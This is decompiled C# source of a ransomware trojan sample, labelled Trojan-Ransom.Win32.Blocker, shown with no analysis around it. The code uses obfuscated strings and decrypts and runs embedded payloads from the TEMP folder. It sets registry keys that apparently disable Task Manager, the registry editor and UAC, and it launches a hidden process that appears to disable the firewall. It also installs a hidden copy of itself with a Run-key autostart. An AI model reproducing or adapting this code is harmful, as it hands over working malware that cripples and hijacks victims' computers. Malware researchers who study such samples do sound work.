// Decompiled with JetBrains decompiler
// Type: 
// Assembly: roger, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FB9A8342-C232-4B78-B1AD-3E0EEEB4F652
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Blocker.jfgm-e57fff192531e351557e2c356286434ba20fcf81d27ff881956c48e520f37c36.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal static class \uE002
{
  private static string \uE000 = \uE003.\uE000("\uE09C\uE0CD\uE0C8\uE098\uE09B\uE0CD\uE09A\uE0C8\uE0CC\uE09B\uE0CC\uE0CD\uE09A\uE09D\uE09D\uE0CC\uE0CD\uE0CB\uE0C8\uE0CC\uE0CC\uE0C8\uE0C6\uE098\uE0C8\uE09C\uE0CD\uE09C\uE09B\uE0CC\uE09C\uE0C6", 57550);
  private static string \uE001 = \uE003.\uE000("\uE09C\uE0CD\uE0C8\uE098\uE09B\uE0CD\uE09A\uE0C8\uE0CC\uE09B\uE0CC\uE0CD\uE09A\uE09D\uE09D\uE0CC\uE0CD\uE0CB\uE0C8\uE0CC\uE0CC\uE0C8\uE0C6\uE098\uE0C8\uE09C\uE0CD\uE09C\uE09B\uE0CC\uE09C\uE0C6", 57550);
  private static string[] \uE002 = new string[2]
  {
    \uE003.\uE000("\uF312\uF308\uF309\uF31F\uF302\uF355\uF31E\uF303\uF31E", 62314),
    \uE003.\uE000("\uECD4\uECD0\uECC5\uECD3\uECCE\uEC99\uECD2\uECCF\uECD2", 60471)
  };
  private static string \uE003 = \uE003.\uE000("\uE3B9\uE3A6\uE39D\uE380\uE398\uE3AF\uE3AE\uE3C7\uE390\uE38E\uE3A4\uE395\uE399\uE391\uE3B8\uE3A5\uE3AF\uE390", 58134);
  private static bool \uE004 = true;
  private static bool \uE005 = true;
  private static bool \uE006 = true;
  private static bool \uE007 = true;
  private static bool \uE008 = true;
  private static bool \uE009 = true;
  private static bool \uE00A = true;
  private static bool \uE00B = true;
  private static bool \uE00C = true;
  private static bool \uE00D = true;
  private static bool \uE00E = true;
  private static bool \uE00F = true;
  private static bool \uE010 = true;
  private static bool \uE011 = true;
  private static bool \uE012 = true;
  private static bool \uE013 = true;
  private static bool \uE014 = false;
  private static string \uE015 = \uE003.\uE000("\uEBA1\uEB96\uEB9B\uEB82\uEB92\uEB91\uEB96\uEB9C\uEB92\uEBB2\uEB85\uEB85\uEB98\uEB85\uEBA3\uEB9E\uEB83\uEB9B\uEB92", 60407);
  private static string \uE016 = \uE003.\uE000("\uE80D\uE83A\uE837\uE82E\uE83E\uE83D\uE83A\uE830\uE83E\uE81E\uE829\uE829\uE834\uE829\uE816\uE83E\uE828\uE828\uE83A\uE83C\uE83E", 59417);
  private static bool \uE017 = true;
  private static bool \uE018 = false;
  private static bool \uE019 = true;
  private static bool \uE01A = true;
  private static bool \uE01B = false;
  private static bool \uE01C = false;
  private static bool \uE01D = true;
  private static string \uE01E = \uE003.\uE000("\uEB81\uEB81\uEBE4\uEB9A\uEBEF\uEBAD\uEBE0\uEBBE\uEBA6\uEB8E\uEB87\uEBA1\uEBF9\uEBB2\uEBAF\uEBB2", 60246);
  private static bool \uE01F = false;

  private static void \uE000(string _param0, string _param1)
  {
    int num = (int) MessageBox.Show(_param0, _param1, MessageBoxButtons.OK, MessageBoxIcon.Hand);
  }

  private static byte[] \uE001(byte[] _param0)
  {
    MemoryStream memoryStream1 = new MemoryStream();
    memoryStream1.Write(_param0, 0, _param0.Length);
    memoryStream1.Position = 0L;
    GZipStream gzipStream = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress, true);
    MemoryStream memoryStream2 = new MemoryStream();
    byte[] buffer = new byte[64];
    for (int count = gzipStream.Read(buffer, 0, buffer.Length); count > 0; count = gzipStream.Read(buffer, 0, buffer.Length))
      memoryStream2.Write(buffer, 0, count);
    gzipStream.Close();
    return memoryStream2.ToArray();
  }

  private static byte[] \uE002(string _param0) => Convert.FromBase64String(_param0);

  private static byte[] \uE003(byte[] _param0, string _param1)
  {
    PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(_param1, Encoding.Default.GetBytes(_param1));
    MemoryStream memoryStream = new MemoryStream();
    Rijndael rijndael = Rijndael.Create();
    rijndael.Key = passwordDeriveBytes.GetBytes(32);
    rijndael.IV = passwordDeriveBytes.GetBytes(16);
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
    cryptoStream.Write(_param0, 0, _param0.Length);
    cryptoStream.Close();
    return memoryStream.ToArray();
  }

  public static string \uE004(int _param0)
  {
    string str = \uE003.\uE000("\uEA1D\uEA1E\uEA1F\uEA18\uEA19\uEA1A\uEA1B\uEA14\uEA15\uEA1C\uEA6D\uEA6E\uEA6F\uEA68\uEA69\uEA6A\uEA6B\uEA64\uEA65\uEA66\uEA67\uEA60\uEA61\uEA62\uEA63\uEA7C\uEA7D\uEA7E\uEA7F\uEA78\uEA79\uEA7A\uEA7B\uEA74\uEA75\uEA76\uEA4D\uEA4E\uEA4F\uEA48\uEA49\uEA4A\uEA4B\uEA44\uEA45\uEA46\uEA47\uEA40\uEA41\uEA42\uEA43\uEA5C\uEA5D\uEA5E\uEA5F\uEA58\uEA59\uEA5A\uEA5B\uEA54\uEA55\uEA56", 59916);
    Random random = new Random();
    StringBuilder stringBuilder = new StringBuilder();
    for (int index = 0; index < _param0; ++index)
      stringBuilder.Append(str[random.Next(str.Length)]);
    return stringBuilder.ToString();
  }

  private static void Main()
  {
    if (!(\uE002.\uE000 == \uE002.\uE001))
      return;
    if (\uE002.\uE014)
    {
      try
      {
        new Thread((ThreadStart) (() => \uE002.\uE000(\uE002.\uE016, \uE002.\uE015))).Start();
      }
      catch
      {
      }
    }
    for (int index = 0; index < \uE002.\uE002.Length; ++index)
    {
      try
      {
        StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(\uE003.\uE000("\uF18D\uF19A\uF18C\uF18C\uF190\uF18A\uF18D\uF19C\uF19A", 61944) + (object) index));
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        byte[] bytes = \uE002.\uE001(\uE002.\uE003(\uE002.\uE002(end), \uE002.\uE003));
        File.WriteAllBytes(Environment.GetEnvironmentVariable(\uE003.\uE000("\uEFBB\uEFAA\uEFA2\uEFBF", 61349)) + \uE003.\uE000("\uE4A9", 58449) + \uE002.\uE002[index], bytes);
      }
      catch
      {
      }
      try
      {
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable(\uE003.\uE000("\uEFBB\uEFAA\uEFA2\uEFBF", 61349)) + \uE003.\uE000("\uE4A9", 58449) + \uE002.\uE002[index])
          }
        }.Start();
      }
      catch
      {
      }
    }
    if (\uE002.\uE017)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uECC9\uECF5\uECFC\uECEE\uECED\uECFB\uECE8\uECFF\uECC6\uECD7\uECF3\uECF9\uECE8\uECF5\uECE9\uECF5\uECFC\uECEE\uECC6\uECCD\uECF3\uECF4\uECFE\uECF5\uECED\uECE9\uECC6\uECD9\uECEF\uECE8\uECE8\uECFF\uECF4\uECEE\uECCC\uECFF\uECE8\uECE9\uECF3\uECF5\uECF4\uECC6\uECDF\uECE2\uECEA\uECF6\uECF5\uECE8\uECFF\uECE8\uECC6\uECDB\uECFE\uECEC\uECFB\uECF4\uECF9\uECFF\uECFE", 60560), true).SetValue(\uE003.\uE000("\uE8AA\uE881\uE88E\uE88D\uE883\uE88A\uE8AD\uE88E\uE883\uE883\uE880\uE880\uE881\uE8BB\uE886\uE89F\uE89C", 59493), (object) \uE003.\uE000("\uEBCD", 60349), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey1 = Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065), true);
        if (registryKey1 == null)
          Registry.CurrentUser.CreateSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065));
        registryKey1.SetValue(\uE003.\uE000("\uF4BB\uF490\uF49F\uF49C\uF492\uF49B\uF4B2\uF4AB\uF4BF", 62478), (object) \uE003.\uE000("\uEBCD", 60349), RegistryValueKind.DWord);
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065), true);
        if (registryKey2 == null)
          Registry.LocalMachine.CreateSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065));
        registryKey2.SetValue(\uE003.\uE000("\uF4BB\uF490\uF49F\uF49C\uF492\uF49B\uF4B2\uF4AB\uF4BF", 62478), (object) \uE003.\uE000("\uEBCD", 60349), RegistryValueKind.DWord);
      }
      catch
      {
      }
      if (\uE002.\uE018)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uEEE5\uEED9\uEED0\uEEC2\uEEC1\uEED7\uEEC4\uEED3\uEEEA\uEEE6\uEED9\uEEDA\uEEDF\uEED5\uEEDF\uEED3\uEEC5\uEEEA\uEEFB\uEEDF\uEED5\uEEC4\uEED9\uEEC5\uEED9\uEED0\uEEC2\uEEEA\uEEE1\uEEDF\uEED8\uEED2\uEED9\uEEC1\uEEC5\uEEEA\uEEE5\uEECF\uEEC5\uEEC2\uEED3\uEEDB", 61074), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE003.\uE000("\uEEE5\uEED9\uEED0\uEEC2\uEEC1\uEED7\uEEC4\uEED3\uEEEA\uEEE6\uEED9\uEEDA\uEEDF\uEED5\uEEDF\uEED3\uEEC5\uEEEA\uEEFB\uEEDF\uEED5\uEEC4\uEED9\uEEC5\uEED9\uEED0\uEEC2\uEEEA\uEEE1\uEEDF\uEED8\uEED2\uEED9\uEEC1\uEEC5\uEEEA\uEEE5\uEECF\uEEC5\uEEC2\uEED3\uEEDB", 61074));
          registryKey.SetValue(\uE003.\uE000("\uEADB\uEAF6\uEAEC\uEAFE\uEAFD\uEAF3\uEAFA\uEADC\uEAD2\uEADB", 59911), (object) \uE003.\uE000("\uE9C5", 59648), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
      if (\uE002.\uE019)
      {
        try
        {
          new Process()
          {
            StartInfo = {
              FileName = \uE003.\uE000("\uE1A1\uE18A\uE19B\uE19C\uE187", 57669),
              Arguments = \uE003.\uE000("\uE8B7\uE892\uE880\uE890\uE89F\uE884\uE893\uE881\uE897\uE89A\uE89A\uE8D6\uE885\uE893\uE882\uE8D6\uE8B5\uE883\uE884\uE884\uE893\uE898\uE882\uE886\uE884\uE899\uE890\uE89F\uE89A\uE893\uE8D6\uE8A5\uE882\uE897\uE882\uE893\uE8D6\uE899\uE890\uE890", 59572),
              UseShellExecute = false,
              CreateNoWindow = true
            }
          }.Start();
        }
        catch
        {
        }
      }
      if (\uE002.\uE01A)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065));
          registryKey.SetValue(\uE003.\uE000("\uE39B\uE3B6\uE3AC\uE3BE\uE3BD\uE3B3\uE3BA\uE38D\uE3BA\uE3B8\uE3B6\uE3AC\uE3AB\uE3AD\uE3A6\uE38B\uE3B0\uE3B0\uE3B3\uE3AC", 58319), (object) \uE003.\uE000("\uE9C5", 59648), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
      if (\uE002.\uE01B)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uE1A8\uE194\uE19D\uE18F\uE18C\uE19A\uE189\uE19E\uE1A7\uE1B6\uE192\uE198\uE189\uE194\uE188\uE194\uE19D\uE18F\uE1A7\uE1AC\uE192\uE195\uE19F\uE194\uE18C\uE188\uE1A7\uE1B8\uE18E\uE189\uE189\uE19E\uE195\uE18F\uE1AD\uE19E\uE189\uE188\uE192\uE194\uE195\uE1A7\uE1AB\uE194\uE197\uE192\uE198\uE192\uE19E\uE188\uE1A7\uE1BE\uE183\uE18B\uE197\uE194\uE189\uE19E\uE189", 57778), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE003.\uE000("\uE1A8\uE194\uE19D\uE18F\uE18C\uE19A\uE189\uE19E\uE1A7\uE1B6\uE192\uE198\uE189\uE194\uE188\uE194\uE19D\uE18F\uE1A7\uE1AC\uE192\uE195\uE19F\uE194\uE18C\uE188\uE1A7\uE1B8\uE18E\uE189\uE189\uE19E\uE195\uE18F\uE1AD\uE19E\uE189\uE188\uE192\uE194\uE195\uE1A7\uE1AB\uE194\uE197\uE192\uE198\uE192\uE19E\uE188\uE1A7\uE1BE\uE183\uE18B\uE197\uE194\uE189\uE19E\uE189", 57778));
          registryKey.SetValue(\uE003.\uE000("\uE7AB\uE786\uE79C\uE78E\uE783\uE783\uE780\uE798\uE7BD\uE79A\uE781", 59370), (object) \uE003.\uE000("\uE9C5", 59648), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
      if (\uE002.\uE01C)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065), true);
          if (registryKey == null)
            Registry.CurrentUser.CreateSubKey(\uE003.\uE000("\uEE9A\uEEA6\uEEAF\uEEBD\uEEBE\uEEA8\uEEBB\uEEAC\uEE95\uEE84\uEEA0\uEEAA\uEEBB\uEEA6\uEEBA\uEEA6\uEEAF\uEEBD\uEE95\uEE9E\uEEA0\uEEA7\uEEAD\uEEA6\uEEBE\uEEBA\uEE95\uEE8A\uEEBC\uEEBB\uEEBB\uEEAC\uEEA7\uEEBD\uEE9F\uEEAC\uEEBB\uEEBA\uEEA0\uEEA6\uEEA7\uEE95\uEE99\uEEA6\uEEA5\uEEA0\uEEAA\uEEA0\uEEAC\uEEBA\uEE95\uEE9A\uEEB0\uEEBA\uEEBD\uEEAC\uEEA4", 61065));
          registryKey.SetValue(\uE003.\uE000("\uE1AA\uE187\uE19D\uE18F\uE18C\uE182\uE18B\uE1BA\uE18F\uE19D\uE185\uE1A3\uE189\uE19C", 57742), (object) \uE003.\uE000("\uE9C5", 59648), RegistryValueKind.DWord);
        }
        catch
        {
        }
      }
    }
    if (\uE002.\uE01D)
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \uE003.\uE000("\uE4A9", 58449) + \uE002.\uE01E;
      try
      {
        Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uECC9\uECF5\uECFC\uECEE\uECED\uECFB\uECE8\uECFF\uECC6\uECD7\uECF3\uECF9\uECE8\uECF5\uECE9\uECF5\uECFC\uECEE\uECC6\uECCD\uECF3\uECF4\uECFE\uECF5\uECED\uECE9\uECC6\uECD9\uECEF\uECE8\uECE8\uECFF\uECF4\uECEE\uECCC\uECFF\uECE8\uECE9\uECF3\uECF5\uECF4\uECC6\uECDF\uECE2\uECEA\uECF6\uECF5\uECE8\uECFF\uECE8\uECC6\uECDB\uECFE\uECEC\uECFB\uECF4\uECF9\uECFF\uECFE", 60560), true).SetValue(\uE003.\uE000("\uE5B4\uE595\uE598\uE598\uE599\uE592", 58816), (object) \uE003.\uE000("\uF2E6", 62148), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        File.WriteAllBytes(path, File.ReadAllBytes(Application.ExecutablePath));
        File.SetAttributes(path, FileAttributes.Hidden);
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey(\uE003.\uE000("\uE884\uE8B8\uE8B1\uE8A3\uE8A0\uE8B6\uE8A5\uE8B2\uE88B\uE89A\uE8BE\uE8B4\uE8A5\uE8B8\uE8A4\uE8B8\uE8B1\uE8A3\uE88B\uE880\uE8BE\uE8B9\uE8B3\uE8B8\uE8A0\uE8A4\uE88B\uE894\uE8A2\uE8A5\uE8A5\uE8B2\uE8B9\uE8A3\uE881\uE8B2\uE8A5\uE8A4\uE8BE\uE8B8\uE8B9\uE88B\uE885\uE8A2\uE8B9", 59607), true).SetValue(\uE003.\uE000("\uF2F7\uF2FC\uF2FA\uF2E6\uF295\uF2F7\uF2D4\uF2D6\uF2DE\uF2C0\uF2C5", 62085), (object) path);
        Registry.LocalMachine.OpenSubKey(\uE003.\uE000("\uE884\uE8B8\uE8B1\uE8A3\uE8A0\uE8B6\uE8A5\uE8B2\uE88B\uE89A\uE8BE\uE8B4\uE8A5\uE8B8\uE8A4\uE8B8\uE8B1\uE8A3\uE88B\uE880\uE8BE\uE8B9\uE8B3\uE8B8\uE8A0\uE8A4\uE88B\uE894\uE8A2\uE8A5\uE8A5\uE8B2\uE8B9\uE8A3\uE881\uE8B2\uE8A5\uE8A4\uE8BE\uE8B8\uE8B9\uE88B\uE885\uE8A2\uE8B9", 59607), true).SetValue(\uE003.\uE000("\uF2F7\uF2FC\uF2FA\uF2E6\uF295\uF2F7\uF2D4\uF2D6\uF2DE\uF2C0\uF2C5", 62085), (object) path);
      }
      catch
      {
      }
    }
    if (!\uE002.\uE01F)
      return;
    try
    {
      File.WriteAllText(Environment.GetEnvironmentVariable(\uE003.\uE000("\uEFBB\uEFAA\uEFA2\uEFBF", 61349)) + \uE003.\uE000("\uE4B2\uE48A\uE48B\uE482\uE48B\uE49A\uE48B\uE4C0\uE48C\uE48F\uE49A", 58606), \uE003.\uE000("\uEACC\uEAA4\uEA93\uEA86\uEA93\uEA97\uEA82\uEAFC\uEA92\uEA93\uEA9A\uEAD6\uEAD4", 59926) + Application.ExecutablePath + \uE003.\uE000("\uE285\uE2AD\uE2CE\uE2C1\uE287\uE2C2\uE2DF\uE2CE\uE2D4\uE2D3\uE287\uE285", 57985) + Application.ExecutablePath + \uE003.\uE000("\uE058\uE05A\uE01D\uE015\uE00E\uE015\uE05A\uE028\uE01F\uE00A\uE01F\uE01B\uE00E", 57368));
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable(\uE003.\uE000("\uEFBB\uEFAA\uEFA2\uEFBF", 61349)) + \uE003.\uE000("\uE4B2\uE48A\uE48B\uE482\uE48B\uE49A\uE48B\uE4C0\uE48C\uE48F\uE49A", 58606)),
          UseShellExecute = false,
          CreateNoWindow = true
        }
      }.Start();
    }
    catch
    {
    }
  }
}
